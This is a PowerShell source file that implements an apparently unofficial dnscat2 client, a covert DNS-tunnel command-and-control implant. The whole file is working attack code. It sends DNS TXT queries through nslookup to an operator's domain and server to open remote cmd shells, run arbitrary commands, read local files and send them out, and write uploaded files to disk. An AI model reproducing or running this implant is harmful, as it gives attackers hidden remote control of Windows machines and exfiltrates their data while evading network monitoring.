function ConvertTo-HexArray ($String) {
    return [System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($String)).split("-")
}

function Convert-HexString ($HexString) {
    $StringData = ""
    while ($HexString.Length -gt 0) {
        $StringData += [string][char][Convert]::ToInt16(($HexString[0..1] -join ""),16)
        $HexString = $HexString.Substring(2)
    }
    return $StringData
}

function New-RandomDNSField {
    return [string](Get-Random -Maximum 9999 -Minimum 1000)
}

function Update-Dnscat2ACK ($Data, $AcknowledgementNumber) {
    return ([string]("{0:x}" -f (([uint16]("0x" + $AcknowledgementNumber) + $Data.Length/2) % 65535)))
}

function Compare-SequenceNumber ($SequenceNumber, $AcknowledgementNumber) {
    $SequenceNumber = [uint16]("0x" + $SequenceNumber)
    $AcknowledgementNumber = [uint16]("0x" + $AcknowledgementNumber)
    if ($AcknowledgementNumber -lt $SequenceNumber) { # ACK recently rolled over
        return ($AcknowledgementNumber + 65535 - $SequenceNumber)
    } else {
        return ($AcknowledgementNumber - $SequenceNumber)
    }
}

function New-Dnscat2SYN ($Domain, $SessionId, $SequenceNumber, $Options) {
    return ((New-RandomDNSField) + "00" + $SessionId + $SequenceNumber + $Options + "." + $Domain)
}

function New-Dnscat2FIN ($Domain, $SessionId) {
    return ((New-RandomDNSField) + "02" + $SessionId + "00" + "." + $Domain)
}

function New-Dnscat2MSG ($Domain, $SessionId, $SequenceNumber, $AcknowledgementNumber, $Data) {
    return ((New-RandomDNSField) + "01" + $SessionId + $SequenceNumber + $AcknowledgementNumber + $Data + "." + $Domain)
}

function Get-NextDnscat2Data ($DataQueue, $MaxMSGDataSize) {
    if ($DataQueue.Length -eq 0) {
        return ""
    }
    
    $DataQueue = $DataQueue -replace '(..(?!$))','$1-' -split '-'
    #$DataQueue = ConvertTo-HexArray $DataQueue
    $PacketCount = 0    # Tracks the total chars in the packet
    $SectionCount = 0    # Tracks the chars in each section between dots
    $Packet = ""
    foreach($Char in $DataQueue) {
        if($SectionCount -ge 30) {
            $SectionCount = 0
            $Packet += "."
        }
        if($PacketCount -ge ($MaxMSGDataSize)) {
            return $Packet.TrimEnd(".")
        }
        $Packet += $Char
        $SectionCount += 2
        $PacketCount += 2
    }
    return $Packet.TrimEnd(".")
}

function Send-Dnscat2Packet ($Packet, $DNSServer, $DNSPort) {
    $Command = ("set type=TXT`nserver $DNSServer`nset port=$DNSPort`nset retry=1`n" + $Packet + "`nexit")
    $result = ($Command | nslookup 2>&1 | Out-String)
    if ($result.Contains('"')) {
        return ([regex]::Match($result.replace("bio=",""),'(?<=")[^"]*(?=")').Value)
    } else {
        return 1
    }
}

function ConvertTo-Dnscat2Packet ($RawPacket) {
    if ((($RawPacket.Length)%2 -eq 1) -or ($RawPacket.Length -eq 0)) {
        return 1
    }
    
    $Packet = New-Object System.Collections.Hashtable
    $Packet["PacketId"] = ($RawPacket[0..3] -join "")
    $Packet["MessageType"] = ($RawPacket[4..5] -join "")
    $Packet["SessionId"] = ($RawPacket[6..9] -join "")
    
    $Data = ""
    switch ($Packet["MessageType"]) {
        "00" {
            $Packet["SequenceNumber"] = ($RawPacket[10..13] -join "")
            $Packet["AcknowledgementNumber"] = ($RawPacket[10..13] -join "")
            $Packet["Options"] = ($RawPacket[14..17] -join "")
            if ($Packet["Options"] -eq 1) {
                # Name
                $Packet["Name"] = ($RawPacket[18..$RawPacket.Length] -join "")
            } elseif ($Packet["Options"] -eq 32) {
                # Command
            }
          }
        "01" {
            $Packet["SequenceNumber"] = ($RawPacket[10..13] -join "")
            $Packet["AcknowledgementNumber"] = ($RawPacket[14..17] -join "")
            $Packet["Data"] = $RawPacket[18..$RawPacket.Length] -join ""

          }
        "02" {
            $Packet["Reason"] = ($RawPacket[10..$RawPacket.Length] -join "")
          }
    }
    return $Packet
}

function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPort, $MaxPacketSize, $Delay, $Driver, $DriverOptions) {
    $SequenceNumber = (New-RandomDNSField)
    $Packet = ConvertTo-Dnscat2Packet (Send-Dnscat2Packet (New-Dnscat2SYN $Domain $SessionId $SequenceNumber $Options) $DNSServer $DNSPort)
    if ($Packet -eq 1) {
        Write-Error "Failed to start session. Ensure your dnscat2 server is set up correctly."
        return 1
    }
    
    $Session = New-Object System.Collections.Hashtable
    $Session["SessionId"] = $SessionId
    $Session["Domain"] = $Domain
    $Session["DNSServer"] = $DNSServer
    $Session["DNSPort"] = $DNSPort
    $Session["DriverDataQueue"] = $Packet["Data"]
    $Session["SequenceNumber"] = $SequenceNumber
    $Session["AcknowledgementNumber"] = $Packet["AcknowledgementNumber"]
    $Session["MaxPacketSize"] = $MaxPacketSize
    $Session["MaxMSGDataSize"] = ($MaxPacketSize - (New-Dnscat2MSG $Domain $SessionId $Packet["SequenceNumber"] $Packet["AcknowledgementNumber"] "").Length)
    $Session["Driver"] = $Driver
    $Session["Dead"] = $False
    $Session["NewSessions"] = New-Object System.Collections.Hashtable
    $Session["Delay"] = $Delay
    if($Driver -eq "console") {
    } elseif ($Driver -eq "command") {
        $Session["RemainingBytes"] = 0
        $Session["PacketId"] = ""
        $Session["PacketIdBF"] = ""
        $Session["IsResponse"] = ""
        $Session["CommandId"] = ""
        $Session["CommandFields"] = ""
    } elseif ($Driver -eq "exec") {
        $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
        $ProcessStartInfo.FileName = $DriverOptions
        $ProcessStartInfo.UseShellExecute = $False
        $ProcessStartInfo.RedirectStandardInput = $True
        $ProcessStartInfo.RedirectStandardOutput = $True
        $ProcessStartInfo.RedirectStandardError = $True
        $Process = [System.Diagnostics.Process]::Start($ProcessStartInfo)
        $Process.Start() | Out-Null
        $StdOutDestinationBuffer = New-Object System.Byte[] 65536
        $StdOutReadOperation = $Process.StandardOutput.BaseStream.BeginRead($StdOutDestinationBuffer, 0, 65536, $null, $null)
        $StdErrDestinationBuffer = New-Object System.Byte[] 65536
        $StdErrReadOperation = $Process.StandardError.BaseStream.BeginRead($StdErrDestinationBuffer, 0, 65536, $null, $null)
        $Session["Process"] = $Process
        $Session["ProcessId"] = $Process.Id
        $Session["StdOutReadOperation"] = $StdOutReadOperation
        $Session["StdOutDestinationBuffer"] = $StdOutDestinationBuffer
        $Session["StdErrReadOperation"] = $StdErrReadOperation
        $Session["StdErrDestinationBuffer"] = $StdErrDestinationBuffer
    }
    if ($Session["MaxMSGDataSize"] -le 0) {
        Write-Error "Domain name is too long."
        return 1
    }
    return $Session
}

function Update-Dnscat2CommandSession ($Data, $Session) {

    ## PROCESS COMMAND PACKET
    if ($Session["RemainingBytes"] -eq 0) { # A new packet has arrived!
        # Decode Command Packet
        $Session["Length"] = [Convert]::ToUInt32($Data[0..7] -join '', 16)
        $Session["PacketId"] = $Data[8..11] -join ''
        $Session["PacketIdBF"] = [Convert]::ToString(([convert]::ToUInt16($Data[8..11] -join '', 16) -bxor ([Math]::Floor(1 * [Math]::Pow(2,15)))),16)
        $Session["IsResponse"] = (($Session["PacketId"] -band [Math]::Floor(1 * [Math]::Pow(2,15))) -eq ([Math]::Floor(1 * [Math]::Pow(2,15))))
        $Session["CommandId"] = $Data[12..15] -join ''
        $Session["CommandFields"] = $Data[16..$Data.Length] -join ''
        $Session["RemainingBytes"] = ($Session["Length"] - 4 - ($Session["CommandFields"].Length / 2))
    } else {
        # Is it possible to send multiple command packets in one dnscat2 packet?
        # If so there will be problems here
        while (($Session["RemainingBytes"] -gt 0) -and ($Data.Length -gt 0)) {
            $Session["CommandFields"] += $Data[0..1] -join ''
            $Data = $Data.Substring(2)
            $Session["RemainingBytes"] -= 1
        }
    }

    ## INVOKE COMMAND PACKET
    if ($Session["RemainingBytes"] -eq 0) {
        switch ($Session["CommandId"])
        {
            "0000" # COMMAND_PING
            {
                if ($Session.IsResponse) {
                    Write-Host -n $Session["CommandFields"]
                } else {
                    #$PacketLengthField = ([Convert]::ToString((8 + $Session.CommandFields.Length),16)).PadLeft(8, '0')
                    $PacketLengthField = ([Convert]::ToString((4 + $Session.CommandFields.Length/2),16)).PadLeft(8, '0')
                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0000" + $Session.CommandFields)
                    

                    $Session["DriverDataQueue"] += $DriverData
                }
                return $Session
            }
            "0001" # COMMAND_SHELL
            {
                $NewSessionName = $Session.CommandFields
                $NewSession = Start-Dnscat2Session (New-RandomDNSField) ("0001" + $NewSessionName) $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.Delay "exec" "cmd"
                $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
                $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0001" + $NewSession.SessionId)
                $Session["DriverDataQueue"] += $DriverData
                return $Session
            }
            "0002" # COMMAND_EXEC
            {
                $NewSessionName = $Session.CommandFields.split("00")[0]
                $NewSessionCommand = Convert-HexString $Session.CommandFields.split("00")[2]
                $NewSession = Start-Dnscat2Session (New-RandomDNSField) ("0002" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.Delay "exec" $NewSessionCommand
                $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
                $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0002" + $NewSession.SessionId)
                $Session["DriverDataQueue"] += $DriverData
                return $Session
            }
            "0003" # COMMAND_DOWNLOAD
            {
                $FileName = Convert-HexString $Session.CommandFields.TrimEnd('00')
                $FileHexDump = ([System.BitConverter]::ToString([IO.File]::ReadAllBytes($FileName)) -replace '-')
                $PacketLengthField = ([Convert]::ToString((4 + $FileHexDump.Length/2),16)).PadLeft(8, '0')
                $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0003" + $FileHexDump)
                $Session["DriverDataQueue"] += $DriverData
                return $Session
            }
            "0004" # COMMAND_UPLOAD
            {
                try {
                    $Data = $Session['CommandFields']

                    $FileName = Convert-HexString ($Data[0..($Data.IndexOf('00') - 1)] -join '')
                    [String]$Data = (($Data[($Data.IndexOf('00') + 2)..$Data.Length]) -join '')
                    [byte[]]$Bytes = @()
                    while ($Data.Length -gt 0) {
                        $Bytes += [Convert]::ToInt16(($Data[0..1] -join ""),16)
                        $Data = $Data.Substring(2)
                    }
                    [IO.File]::WriteAllBytes($FileName, $Bytes) 2>&1 | Out-Null
                } catch {
                    $ErrorCode = "7FFF"
                    $Reason = ((ConvertTo-HexArray "Could not write file") -join "") + "00"
                    $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0003" + $FileHexDump)
                    $Session["DriverDataQueue"] += $DriverData
                }
            }
            "0006" # COMMAND_DELAY
            {
                try {
                    $Session["Delay"] = [Convert]::ToUInt32($Session.CommandFields, 16)
                    Write-Host ('New Delay: ' + $Session["Delay"].ToString())
                } catch {}
                
            }
        }
    }
    
    return $Session
}

function Read-DataFromDriver ($Session) {
    if ($Session["Driver"] -eq "console") {
        $Data = ""
        if($Host.UI.RawUI.KeyAvailable) {
            $Data = ((Read-Host) + "`n")
        }
        $Session["DriverDataQueue"] += (ConvertTo-HexArray $Data) -join ""
        return $Session
    } elseif ($Session["Driver"] -eq "exec") {
        if($Host.UI.RawUI.KeyAvailable) {
            $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyUp") | Out-Null
        }
        if($Session["StdOutReadOperation"].IsCompleted) {
            $StdOutBytesRead = ($Session["Process"]).StandardOutput.BaseStream.EndRead($Session["StdOutReadOperation"])
            if($StdOutBytesRead -eq 0){ $Session.Dead = $True; return $Session }
            $Session["DriverDataQueue"] += ([System.BitConverter]::ToString($Session["StdOutDestinationBuffer"][0..([int]$StdOutBytesRead-1)]).split("-") -join "")
            $Session["StdOutReadOperation"] = ($Session["Process"]).StandardOutput.BaseStream.BeginRead($Session["StdOutDestinationBuffer"], 0, 65536, $null, $null)
        }
        if($Session["StdErrReadOperation"].IsCompleted) {
            $StdErrBytesRead = ($Session["Process"]).StandardError.BaseStream.EndRead($Session["StdErrReadOperation"])
            if($StdErrBytesRead -eq 0){ $Session.Dead = $True; return $Session }
            $Session["DriverDataQueue"] += ([System.BitConverter]::ToString($Session["StdErrDestinationBuffer"][0..([int]$StdErrBytesRead-1)]).split("-") -join "")
            $Session["StdErrReadOperation"] = ($Session["Process"]).StandardError.BaseStream.BeginRead($Session["StdErrDestinationBuffer"], 0, 65536, $null, $null)
        }
        return $Session
    }
    return $Session
}

function Send-DataToDriver ($Data, $Session) {

    if ($Session["Driver"] -eq "console") {
        $StringData = Convert-HexString $Data
        Write-Host -n $StringData
    } elseif (($Session["Driver"] -eq "command") -and $Data.Length -gt 8) {
        $Session = Update-Dnscat2CommandSession $Data $Session
    } elseif ($Session["Driver"] -eq "exec") {
        $StringData = Convert-HexString $Data
        ($Session["Process"]).StandardInput.WriteLine($StringData.TrimEnd("`r").TrimEnd("`n"))
    }
    return $Session
}

function Stop-Dnscat2Session ($Session) {
    Send-Dnscat2Packet (New-Dnscat2FIN $Session["Domain"] $Session["SessionId"] $Session["Domain"]) $Session["DNSServer"] $Session["DNSPort"] | Out-Null
    if ($Session["Driver"] -eq "exec") {
        taskkill /T /F /PID $Session["ProcessId"] 2>&1 | Out-Null
    }
    $Session["Dead"] = $True
    return $Session
}

function Update-Dnscat2Session ($Session) {
    try {
        # Delay
        Sleep -Milliseconds $Session['Delay']
    
        # Retrive Driver Data
        $Session = Read-DataFromDriver $Session
        
        if ($Session.Dead) {
            $Session = Stop-Dnscat2Session $Session
            return $Session
        }
        
        # Grab next data in the queue
        $PacketData = (Get-NextDnscat2Data $Session["DriverDataQueue"] $Session["MaxMSGDataSize"])
        
        try {
            $Packet = (Send-Dnscat2Packet (New-Dnscat2MSG $Session["Domain"] $Session["SessionId"] $Session["SequenceNumber"] $Session["AcknowledgementNumber"] $PacketData) $Session["DNSServer"] $Session["DNSPort"])
        } catch {
            Write-Host "HOST: Failed to send packet."
			$Session.Dead = $True
        }
        
        try {
            $Packet = (ConvertTo-Dnscat2Packet $Packet)
            if($Packet -eq 1){ Write-Host "HOST: Failed to ConvertTo-Dnscat2Packet..."; $Session.Dead = $True }
            
            if ($Packet["MessageType"] -eq "01") {
                # Check if server ACKed sent data
                $BytesACKed = (Compare-SequenceNumber $Session["SequenceNumber"] $Packet["AcknowledgementNumber"])
                if ($BytesACKed -ne 0) {
                    # If data was ACKed, remove it from Queue
                    $Session["DriverDataQueue"] = $Session["DriverDataQueue"].Substring($BytesACKed*2)
                }
                $Session["SequenceNumber"] = $Packet["AcknowledgementNumber"]
                
                # ACK the server data
                if ($Packet["Data"] -ne "") {
                    $Session["AcknowledgementNumber"] = Update-Dnscat2ACK $Packet["Data"] $Packet["SequenceNumber"]
                    $Session = Send-DataToDriver $Packet["Data"] $Session
                }
            } elseif ($Packet["MessageType"] -eq "02") {
                $Session.Dead = $True
                return $Session
            }
        } catch {
            Write-Verbose "HOST: Caught error while processing packet, dropping..."
			$Session.Dead = $True 
			$Session = Stop-Dnscat2Session $Session
        }
    } catch {
        $Session.Dead = $True
        $Session = Stop-Dnscat2Session $Session
    }
    return $Session
}

function Start-Dnscat2 {
    <#
    .SYNOPSIS
        Start a Dnscat2 session.

    .DESCRIPTION
        This powershell script is an unofficial client for the dnscat2 DNS tunnel.

    .PARAMETER Domain
        The Domain being used by the dnscat2 server.
    
    .PARAMETER DNSServer
        The hostname or IP Address to send DNS queries to.

    .PARAMETER DNSPort
        The port to send DNS queries to.

    .PARAMETER Command
        Start a command session. (Default)
		
    .PARAMETER Exec
        Link the I/O of a process with the Dnscat2 session.
    
    .PARAMETER Console
        Link the I/O of the console with the Dnscat2 session.
    
    .PARAMETER Delay
        Set a delay between each request, in milliseconds. (Default: 0)
    
    .PARAMETER MaxPacketSize
        Maximum length of a dnscat2 packet.
        
    .PARAMETER Name
        The name of your dnscat2 session. (Default: hostname)
    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True)][Alias("d")][string]$Domain,
        [Alias("s")][string]$DNSServer="",
        [Alias("p")][ValidateRange(1,65535)][int32]$DNSPort=53,
		[switch]$Command=$True,
        [Alias("e")][string]$Exec="",
        [switch]$Console=$False,
        [int32]$Delay=0,
        [ValidateRange(1,240)][int32]$MaxPacketSize=240,
        [string]$Name=""
    )
    
    if ($Exec -ne "") {
        $Driver = 'exec'
        $DriverOptions = $Exec
        $SYNOptions = "0001"
    } elseif ($Console) {
        $Driver = 'console'
		$DriverOptions = ""
        $SYNOptions = "0001"
    } else {
		$Driver = 'command'
		$DriverOptions = ""
		$SYNOptions = "0021"
	}
    
    if ($Name -eq '') {
        $Name = $Driver + ' (' + (hostname) + ')'
    }
    $SYNOptions += ((ConvertTo-HexArray $Name) -join '') + '00'
    
    $Sessions = New-Object System.Collections.Hashtable
    $DeadSessions = @()
    $InitialSession = Start-Dnscat2Session (New-RandomDNSField) $SYNOptions $Domain $DNSServer $DNSPort $MaxPacketSize $Delay $Driver $DriverOptions
    if ($InitialSession -eq 1) {
        return
    }
    $Sessions.Add($InitialSession["SessionId"], $InitialSession)
    
    try {
        while ($Sessions.Count -gt 0) {
            # Remove Dead Sessions
            foreach ($SessionId in $DeadSessions) {
                $Sessions.Remove($SessionId)
            }
            $DeadSessions = @()

            # Update Sessions
            $SessionIds = @()
            $SessionIds += $Sessions.Keys
            foreach ($SessionId in $SessionIds) {
                $Sessions[$SessionId] = Update-Dnscat2Session $Sessions[$SessionId]
                
                if ($Sessions[$SessionId].Dead) {
                    $DeadSessions += $SessionId
                }
                
                if (($Sessions[$SessionId])["NewSessions"].Count -gt 0) {
                    foreach ($NewSessionId in $Sessions[$SessionId].NewSessions.Keys) {
                        $Sessions.Add($NewSessionId, $Sessions[$SessionId]["NewSessions"][$NewSessionId])
                    }
                    $Sessions[$SessionId].NewSessions = New-Object System.Collections.Hashtable
                }
            }
        }
    } finally {
        $SessionIds = @()
        $SessionIds += $Sessions.Keys
        foreach ($SessionId in $SessionIds) {
            Stop-Dnscat2Session $Sessions[$SessionId]
        }
    }
}